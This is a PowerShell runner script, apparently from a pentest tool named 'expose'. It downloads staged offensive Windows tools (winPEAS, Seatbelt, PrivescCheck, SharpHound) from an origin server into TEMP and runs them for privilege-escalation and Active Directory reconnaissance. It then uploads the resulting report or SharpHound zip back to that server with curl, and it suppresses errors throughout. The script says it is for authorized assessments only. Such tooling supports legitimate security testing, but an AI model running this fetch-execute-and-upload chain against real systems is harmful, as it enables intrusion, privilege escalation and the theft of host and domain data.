# expose tool runner — downloads a staged Windows tool and uploads its report.
# Third-party tools can trigger Defender/EDR. Authorized assessments only.
$ErrorActionPreference = 'SilentlyContinue'
Write-Warning 'Third-party Windows tool: Defender/EDR may block, quarantine, or alert. Authorized use only.'

if (-not $ExposeTool -or -not $ExposeKind -or -not $ExposeTicket -or -not $ExposeOrigin) {
    Write-Host '[!] Missing tool context. Start the tool from the expose Windows tools panel.'
    return
}

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$url = "$ExposeOrigin/console/tool/$ExposeTool?ticket=$ExposeTicket"
$local = Join-Path $env:TEMP $ExposeTool
try {
    Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $local -ErrorAction Stop
} catch {
    Write-Host "[!] Could not download $ExposeTool from expose: $($_.Exception.Message)"
    return
}

$report = Join-Path $env:TEMP ("expose-{0}-{1}-{2}.txt" -f $ExposeKind, $env:COMPUTERNAME, $stamp)
$zip = $null
try { Start-Transcript -Path $report -Force | Out-Null } catch {}

switch ($ExposeKind) {
    'winpeas' {
        & $local cmd
    }
    'seatbelt' {
        & $local -group=all
    }
    'privesccheck' {
        . $local
        Invoke-PrivescCheck -Extended
    }
    'sharphound' {
        $out = Join-Path $env:TEMP ("expose-sharphound-{0}-{1}" -f $env:COMPUTERNAME, $stamp)
        New-Item -ItemType Directory -Force -Path $out | Out-Null
        & $local -c All --OutputDirectory $out --ZipFileName sharphound.zip
        $zip = Get-ChildItem -LiteralPath $out -Filter '*.zip' | Select-Object -First 1
    }
    default {
        & $local
    }
}

try { Stop-Transcript | Out-Null } catch {}
$upload = $report
if ($ExposeKind -eq 'sharphound' -and $zip) { $upload = $zip.FullName }

if (Test-Path -LiteralPath $upload) {
    $curl = Get-Command curl.exe -ErrorAction SilentlyContinue
    if ($curl) {
        & $curl.Source -s -F "files=@$upload" "$ExposeOrigin/upload?ticket=$ExposeTicket" | Out-Null
        if ($LASTEXITCODE -eq 0) { Write-Host "[+] Report uploaded to $ExposeOrigin" }
        else { Write-Host "[!] Upload failed; retrieve $upload manually." }
    } else {
        Write-Host "[!] curl.exe not found; retrieve $upload manually."
    }
    Write-Host "[+] Report: $upload"
} else {
    Write-Host '[!] No report file was produced. The tool may have been blocked or failed.'
}
